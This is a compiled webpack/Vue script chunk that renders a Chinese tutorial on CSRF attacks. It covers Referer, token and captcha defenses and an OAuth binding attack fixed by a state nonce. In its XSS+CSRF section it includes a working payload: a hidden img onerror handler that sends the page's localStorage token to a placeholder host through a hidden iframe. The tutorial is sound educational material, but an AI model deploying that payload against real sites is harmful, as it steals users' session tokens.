(window.webpackJsonp=window.webpackJsonp||[]).push([[34],{245:function(t,e,r){"use strict";r.r(e);var a=r(0),i=Object(a.a)({},function(){this.$createElement;this._self._c;return this._m(0)},[function(){var t=this,e=t.$createElement,r=t._self._c||e;return r("div",{staticClass:"content"},[r("h2",{attrs:{id:"简单易懂的了解-csrf"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#简单易懂的了解-csrf","aria-hidden":"true"}},[t._v("#")]),t._v(" 简单易懂的了解 CSRF")]),t._v(" "),r("h3",{attrs:{id:"csrf-攻击是什么"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#csrf-攻击是什么","aria-hidden":"true"}},[t._v("#")]),t._v(" CSRF 攻击是什么")]),t._v(" "),r("p",[r("code",[t._v("CSRF")]),t._v("也被称为"),r("code",[t._v("XSRF")]),t._v("，是跨站请求伪造的缩写，是利用用户缓存的登录态，请求自动带上 cookie 骗取服务端信任，执行非本意的操作的攻击方法。\n因为服务器只认请求携带过来的 cookie 信息，只能保证请求来自缓存有用户信息的浏览器，而不知道是不是用户自愿发生的请求。\n与"),r("code",[t._v("XSS")]),t._v("相比，"),r("code",[t._v("XSS")]),t._v("利用了用户对网站的信任，，"),r("code",[t._v("CSRF")]),t._v("利用的是网站对用户网页浏览器的信任。份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。")]),t._v(" "),r("h3",{attrs:{id:"先举个栗子🌰"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#先举个栗子🌰","aria-hidden":"true"}},[t._v("#")]),t._v(" 先举个栗子🌰")]),t._v(" "),r("p",[t._v("假设某博有一个关注接口，可以让登录用户关注某个账号；设想一个情景是该接口有 CSRF 漏洞可以被黑客利用刷关注数。黑客应该如何利用该漏洞？")]),t._v(" "),r("ul",[r("li",[t._v("写个xx网站，搞个隐藏 img 标签，src 为上述关注接口")]),t._v(" "),r("li",[t._v("用户浏览这个网页的时候，会请求上述接口，如果用户登录过头条，这时候登录态就带过去了，关注成功")]),t._v(" "),r("li",[t._v("进阶：使用 form 代替 img，在 window.onload submit form，可以改GET为POST攻击")])]),t._v(" "),r("h3",{attrs:{id:"怎么防御"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#怎么防御","aria-hidden":"true"}},[t._v("#")]),t._v(" 怎么防御")]),t._v(" "),r("p",[t._v("首先得知道它怎么进行攻击，以及攻击的目标")]),t._v(" "),r("ul",[r("li",[t._v("用户必须已经在目标网站登录，然后携带用户的cookie欺骗服务器")]),t._v(" "),r("li",[t._v("黑客并不能拿到 cookie，且看不到 cookie 的内容。由于浏览器同源策略的限制，也无法解析服务返回的内容。所以我们要保护的对象是写服务，而对于读服务则不需要进行CSRF的保护")]),t._v(" "),r("li",[t._v("保护的关键，是 在请求中放入黑客所不能伪造的信息")])]),t._v(" "),r("h4",{attrs:{id:"低端操作"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#低端操作","aria-hidden":"true"}},[t._v("#")]),t._v(" 低端操作")]),t._v(" "),r("p",[t._v("敏感操作用POST代替GET，这个在上面已经说了，没多大用处")]),t._v(" "),r("h4",{attrs:{id:"常规操作"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#常规操作","aria-hidden":"true"}},[t._v("#")]),t._v(" 常规操作")]),t._v(" "),r("h5",{attrs:{id:"限制请求来源-referer"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#限制请求来源-referer","aria-hidden":"true"}},[t._v("#")]),t._v(" 限制请求来源 Referer")]),t._v(" "),r("p",[t._v("方法：HTTP Header 里有一个 referer 字段表示请求的来源，服务器可验证这个 referer 并拒绝访问\n优点：简单易实现\n缺点：严重依赖浏览器实现，上古浏览器referer可被修改，新策略可以允许不带 referer")]),t._v(" "),r("h5",{attrs:{id:"添加-token-验证"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#添加-token-验证","aria-hidden":"true"}},[t._v("#")]),t._v(" 添加 token 验证")]),t._v(" "),r("p",[t._v("方法：")]),t._v(" "),r("ol",[r("li",[t._v("用户在登录的时候服务器产生 token 返回给前端")]),t._v(" "),r("li",[t._v("前端发请求的时候，将 token 放到请求url里或者请求头中带给服务器。")]),t._v(" "),r("li",[t._v("服务器验证 token，由于黑客无法登录得到或者伪造 token，所以能防范 CSRF\n缺点：\n并不绝对安全：")]),t._v(" "),r("li",[t._v("配合其他攻击方式如XSS和JSONP获取到token，再将token待到url参数；\na. 将 token 放到 请求 header 里可避免这个问题，毕竟 img script form 等标签发出的请求无法自定义请求 header")]),t._v(" "),r("li",[t._v("存在更极端的情况\na. abc.com 下有两个服务，通过 nginx 之类分流到 abc.com/a 和 abc.com/b\nb. 当 a 存在隐患被攻击成功后，a 可以修改 abc.com 的 token 信息，且 a 请求到 abc.com 下其他的服务都不存在跨域问题，从而导致一个服务沦陷，同域下其他服务也造成危险")])]),t._v(" "),r("h4",{attrs:{id:"简单粗暴的操作"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#简单粗暴的操作","aria-hidden":"true"}},[t._v("#")]),t._v(" 简单粗暴的操作")]),t._v(" "),r("p",[t._v("方法：添加验证码来验证这个操作是不是用户主动发起的\n优点：简单粗暴，相当可靠\n缺点：对用户不友好")]),t._v(" "),r("h3",{attrs:{id:"oauth-csrf-攻击"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#oauth-csrf-攻击","aria-hidden":"true"}},[t._v("#")]),t._v(" OAuth CSRF 攻击")]),t._v(" "),r("h4",{attrs:{id:"举个栗子🌰："}},[r("a",{staticClass:"header-anchor",attrs:{href:"#举个栗子🌰：","aria-hidden":"true"}},[t._v("#")]),t._v(" 举个栗子🌰：")]),t._v(" "),r("p",[t._v("用户平台（比如某交友平台）；认证服务器（比如github）")]),t._v(" "),r("ol",[r("li",[r("p",[t._v("正常流程")])]),t._v(" "),r("li",[r("p",[t._v("老李登录某交友平台，没关联 github，交友平台 跳转到 github")])]),t._v(" "),r("li",[r("p",[t._v("老李在 github 登录，github 获取用户授权")])]),t._v(" "),r("li",[r("p",[t._v("github 生成老李在 github 平台唯一对应的 code 回调 交友平台 的地址")])]),t._v(" "),r("li",[r("p",[t._v("交友平台 将 code 与老李在自己平台的账号关联\n问题在于 github 授权完成跳回 交友平台 的带有 code 的重定向 URI 对于 交友平台 服务器来说是无状态的，该 code 标识的只是老李在 github 平台的唯一性")])]),t._v(" "),r("li",[r("p",[t._v("张三的攻击流程")])]),t._v(" "),r("li",[r("p",[t._v("张三在 1.c 步奏带上 code 的时候没有真正执行 1.d，比如断网或者恶意存储起来")])]),t._v(" "),r("li",[r("p",[t._v("这时候老李在 交友平台 已登录但是未绑定 github，张三将自己的 code 发给老李，导致老李的号绑定了张三的 github 账号，张三就可以用自己的 github 账号登录老李的 交友平台")])]),t._v(" "),r("li",[r("p",[t._v("那么，张三怎么将 code 发给老李的呢，这时候假设老李访问了张三写的某某相亲平台，里面有一个 img 标签，src 为 交友平台的回调地址并带上张三准备好的 code，因为老李在 交友平台 已经登录且未绑定 github，这时候就相当于把张三的 github 绑定到了老李在 交友平台 的号。完成了一次 CSRF 攻击")])])]),t._v(" "),r("h5",{attrs:{id:"防御办法-随机数校验"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#防御办法-随机数校验","aria-hidden":"true"}},[t._v("#")]),t._v(" 防御办法: 随机数校验")]),t._v(" "),r("p",[t._v("上述攻击的关键就在于 交友平台 无法判断由 github 重定向回的URI是否是当前登录用户老李所发起的授权。可以通过随机数 R 来判断 code 是否合法")]),t._v(" "),r("ol",[r("li",[t._v("交友平台 在跳转 github 的时候往用户 session 写一个随机数 R，并传给 github")]),t._v(" "),r("li",[t._v("github 回调 交友平台 的时候将 code 和 R 一起带给 交友平台")]),t._v(" "),r("li",[t._v("交友平台 将 github 传过来的 R 和 老李 session 里的 R 校验，通过就证明 code 有效")])]),t._v(" "),r("p",[r("b",[t._v("由上可知对利用OAuth进行CSRF攻击的条件是很苛刻的：")]),t._v("攻击者必须了解目标网站的"),r("b",[t._v("绑定特性")]),t._v("，比如一个账号只能绑定一个 OAuth，攻击者只能定向攻击没有绑定 OAuth 的号，并且攻击一次后需要解绑才能攻击下一个。无法快速大范围撒网攻击")]),t._v(" "),r("h3",{attrs:{id:"xss-csrf-配合"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#xss-csrf-配合","aria-hidden":"true"}},[t._v("#")]),t._v(" XSS+CSRF 配合")]),t._v(" "),r("blockquote",[r("p",[t._v("存储型 XSS + CSRF")])]),t._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[t._v('<img\n\twidth="0"\n\theight="0"\n\tsrc="xx"\n\tonerror="javascript:var i=document.createElement(\'iframe\');i.width=0;i.height=0;i.frameBorder=null;i.src=`http://xx/csrf.html?token=${localStorage.getItem(\'token\')}`;document.body.appendChild(i)"\n/>\n')])])]),r("ol",[r("li",[t._v("插一个隐藏的 img 标签，src 乱设置一个请求不通的，必然执行 onerror")]),t._v(" "),r("li",[t._v("onerror 里创建一个隐藏的 iframe，指向 scrf 页面，并带上当前获取到的 token 或 cookie")])]),t._v(" "),r("h3",{attrs:{id:"总结"}},[r("a",{staticClass:"header-anchor",attrs:{href:"#总结","aria-hidden":"true"}},[t._v("#")]),t._v(" 总结")]),t._v(" "),r("p",[r("strong",[t._v("CSRF攻击利用的是服务器无法分辨请求是不是用户本人发起的，所以防范的关键在于在请求中放入黑客所不能伪造的信息。从而防止黑客伪造一个完整的请求欺骗服务器")])])])}],!1,null,null,null);e.default=i.exports}}]);